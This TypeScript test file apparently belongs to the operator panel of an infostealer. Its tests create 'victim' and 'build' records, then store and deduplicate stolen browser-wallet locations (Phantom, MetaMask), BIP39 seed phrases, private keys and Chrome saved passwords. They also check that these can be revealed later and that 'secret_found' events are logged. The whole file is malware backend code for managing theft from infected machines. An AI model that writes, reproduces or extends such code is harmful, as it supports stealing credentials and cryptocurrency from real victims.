import { test } from 'node:test';
import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { prisma } from '../server/lib/db';
import { randomToken, sha256hex } from '../server/lib/crypto';
import { normalizePath, normalizeSecretKind, normalizeState, revealSecret, upsertCredentials, upsertSecrets, upsertWallets } from '../server/services/vault';
import { applyEvent } from '../server/lib/ws-events';

async function victim() {
  const build = await prisma.build.create({
    data: {
      name: `vault-test-${randomUUID()}`,
      version: '0.0.0',
      buildId: randomUUID(),
      tokenHash: sha256hex(randomToken(32)),
      secret: randomToken(32),
      config: {}
    }
  });
  return prisma.victim.create({
    data: { buildId: build.id, hostname: `vault-${randomUUID().slice(0, 8)}`, os: 'windows', username: 'tester', deviceTokenEnc: 'v1.00.00.00' }
  });
}

test('paths and kinds normalize to one stable identity', () => {
  assert.equal(normalizePath('C:\\Users\\Bob\\AppData\\Local\\MetaMask\\ Extension\\'), 'c:/users/bob/appdata/local/metamask/extension');
  assert.equal(normalizePath('C:/Users//Bob/../x/') , 'c:/users/bob/../x');
  assert.equal(normalizePath('C:\\Users\\Bob'), normalizePath('c:/users/bob/'));
  assert.equal(normalizeSecretKind('bip39-24'), 'seed');
  assert.equal(normalizeSecretKind('evm-key'), 'private_key');
  assert.equal(normalizeSecretKind('xprv'), 'private_key');
  assert.equal(normalizeState('no_vault'), 'no_vault');
  assert.equal(normalizeState('garbage', 'found'), 'found');
});

test('three browser profiles with the same wallet stay separate but linked to one target', async () => {
  const row = await victim();
  try {
    const target = 'phantom';
    const profiles = ['Default', 'Profile 1', 'Profile 2'];
    const wallets = await upsertWallets(row.id, profiles.map((profile) => ({
      targetId: target,
      kind: 'extension',
      path: `C:\\Users\\Bob\\AppData\\Local\\Google\\Chrome\\User Data\\${profile}\\Local Extension Settings\\phantom`
    })));
    assert.equal(wallets.length, 3);
    assert.equal(await prisma.wallet.count({ where: { victimId: row.id, targetId: target } }), 3);

    const seed = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
    await upsertSecrets(row.id, wallets.map((wallet) => ({ walletId: wallet.id, kind: 'bip39-12', value: seed, words: 12, source: 'test' })));
    assert.equal(await prisma.walletSecret.count({ where: { wallet: { victimId: row.id } } }), 3);

    // A duplicate scan must not duplicate rows or secrets, and a missing value
    // in a later scan must not delete what was already found.
    await upsertWallets(row.id, profiles.map((profile) => ({
      targetId: target,
      kind: 'extension',
      path: `c:/users/bob/appdata/local/google/chrome/user data/${profile.toLowerCase()}/local extension settings/phantom/`
    })));
    await upsertSecrets(row.id, wallets.map((wallet) => ({ walletId: wallet.id, kind: 'bip39-12', value: seed, words: 12 })));
    assert.equal(await prisma.wallet.count({ where: { victimId: row.id } }), 3);
    assert.equal(await prisma.walletSecret.count({ where: { wallet: { victimId: row.id } } }), 3);

    const revealed = await revealSecret(wallets[0]!.id, 'seed');
    assert.equal(revealed?.value, seed);
    const listing = await prisma.walletSecret.findFirst({ where: { walletId: wallets[0]!.id } });
    assert.equal(listing?.valueEnc.startsWith('v1.'), true);
    assert.equal(listing?.valueEnc.includes(seed), false);
  } finally {
    await prisma.victim.delete({ where: { id: row.id } });
  }
});

test('credentials dedupe by victim, target, path and username', async () => {
  const row = await victim();
  try {
    const input = { path: 'C:\\Users\\Bob\\Login Data', url: 'https://example.test', username: 'bob', password: 's3cret', state: 'found' };
    await upsertCredentials(row.id, 'chrome', null, [input]);
    await upsertCredentials(row.id, 'chrome', null, [{ ...input, path: 'c:/users/bob/login data/' }]);
    assert.equal(await prisma.credential.count({ where: { victimId: row.id } }), 1);
    const stored = await prisma.credential.findFirstOrThrow({ where: { victimId: row.id } });
    assert.equal(stored.username, 'bob');
    assert.notEqual(stored.passwordEnc, 's3cret');
  } finally {
    await prisma.victim.delete({ where: { id: row.id } });
  }
});

test('secret_found collapses onto one event per value per day while the vault keeps the value', async () => {
  const row = await victim();
  try {
    const data = { secret_kind: 'evm-key', value: `0x${'a'.repeat(64)}`, confident: true };
    await applyEvent(row.id, { kind: 'secret_found', data, legacy: 'clave encontrada' });
    await applyEvent(row.id, { kind: 'secret_found', data, legacy: 'clave encontrada' });
    const events = await prisma.event.findMany({ where: { victimId: row.id, kind: 'secret_found' } });
    assert.equal(events.length, 1);
    assert.equal((events[0]!.data as { count: number }).count, 2);
    const eventData = events[0]!.data as { value?: string; preview?: string; hash?: string };
    assert.equal(eventData.value, undefined);
    assert.match(String(eventData.preview), /^0xaaaaaa/);
    assert.ok(eventData.hash);
    const secrets = await prisma.walletSecret.findMany({ where: { wallet: { victimId: row.id } } });
    assert.equal(secrets.length, 1);
    assert.equal(secrets[0]!.kind, 'private_key');
  } finally {
    await prisma.victim.delete({ where: { id: row.id } });
  }
});
